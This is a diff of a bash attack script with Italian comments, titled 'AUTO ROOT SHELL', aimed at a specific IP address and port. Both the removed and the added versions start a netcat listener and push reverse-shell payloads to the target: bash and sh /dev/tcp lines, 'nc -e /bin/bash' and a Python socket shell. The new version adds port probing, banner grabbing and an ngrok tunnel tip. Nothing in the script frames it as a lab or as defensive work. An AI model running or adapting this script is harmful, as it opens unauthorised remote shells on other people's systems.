@@ -1,59 +1,45 @@
 #!/bin/bash
-# 🔥 AUTO ROOT SHELL - NO RlWRAP RICHIESTO
-# 100% AUTOMATICO + UI pulita
+# 🔥 AUTO ROOT SHELL - DEBUG + FIX Connection Refused
+# Test servizio + Multi-payload + IP check
 
-# AUTO IP
-MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ident.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "127.0.0.1")
-PORT=4444
-TARGET="63.164.100.214:9091"
+TARGET_IP="63.164.100.214"
+TARGET_PORT="9091"
 
 clear
-cat << EOF
-╔══════════════════════════════════════╗
-║       🚀 ROOT BASH TERMINAL          ║
-║    IP: $MY_IP:$PORT  →  $TARGET      ║
-╚══════════════════════════════════════╝
-EOF
+echo "🔍 DEBUG + AUTO ROOT SHELL"
+echo "Target: $TARGET_IP:$TARGET_PORT"
+echo "════════════════════════════"
 
-# KILL LISTENER
-pkill nc 2>/dev/null
-sleep 1
+# 1. TEST CONNESSIONE
+echo "[+] Test TCP..."
+timeout 3 nc -zv $TARGET_IP $TARGET_PORT 2>&1 | grep "succeeded" && echo "✅ TCP OK" || echo "❌ TCP DEAD"
 
-# LISTENER + UI
-{
-    echo -e "\n🎧 Listener attivo su $MY_IP:$PORT"
-    echo "⏳ Invio reverse shells... (attendi 15s)"
-    echo "══════════════════════════════════════"
-    
-    # LISTENER SEMPLICE (NO rlwrap)
-    nc -lvnp $PORT
-    
-} &
+# 2. CAPTA SERVIZIO
+echo -e "\n[+] Scopro servizio..."
+timeout 5 nc $TARGET_IP $TARGET_PORT | head -10 || echo "No banner"
 
-sleep 3
+# 3. IP PUBBLICO
+MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ident.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "NO_IP")
+echo "IP pubblico: $MY_IP"
 
-# REVERSE SHELLS MULTIPLI
-for i in {1..10}; do
-    echo -e "\n📤 Shell $i/10..."
-    
-    # Bash reverse
-    (echo "bash -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | nc -w3 $TARGET >/dev/null 2>&1) &
-    
-    # Sh reverse  
-    (echo "sh -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | nc -w3 $TARGET >/dev/null 2>&1) &
-    
-    # NC exec
-    (echo "nc -e /bin/bash $MY_IP $PORT" | nc -w3 $TARGET >/dev/null 2>&1) &
-    
-    # Python mini
-    (python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$MY_IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())" | nc -w3 $TARGET >/dev/null 2>&1) &
-    
-    sleep 1.5
-done
+if [[ "$MY_IP" == "NO_IP" ]]; then
+    echo "❌ NO IP PUBBLICO - Usa tunnel:"
+    echo "ngrok tcp 4444  # Poi sostituisci MY_IP"
+    exit 1
+fi
 
-echo -e "\n✅ TUTTE SHELL INVIATE!"
-echo "🎯 SHELL SI CONNETTERÀ QUI ↓"
-echo "══════════════════════════════════════"
+PORT=4444
 
-# Attendi forever
-wait
+# 4. REVERSE SHELL SEMPLICE (NO PYTHON ERROR)
+echo -e "\n🚀 Avvio listener..."
+nc -lvnp $PORT &
+sleep 2
+
+echo -e "\n📤 INVIO BASh SHELL..."
+echo "bash -c 'bash -i >& /dev/tcp/$MY_IP/$PORT 0>&1'" | nc -w5 $TARGET_IP $TARGET_PORT
+
+echo -e "\n🔥 Shell pronta! (Ctrl+C per uscire)"
+echo "═══════════════════════════════════════"
+
+# Attendi
+nc -lvnp $PORT
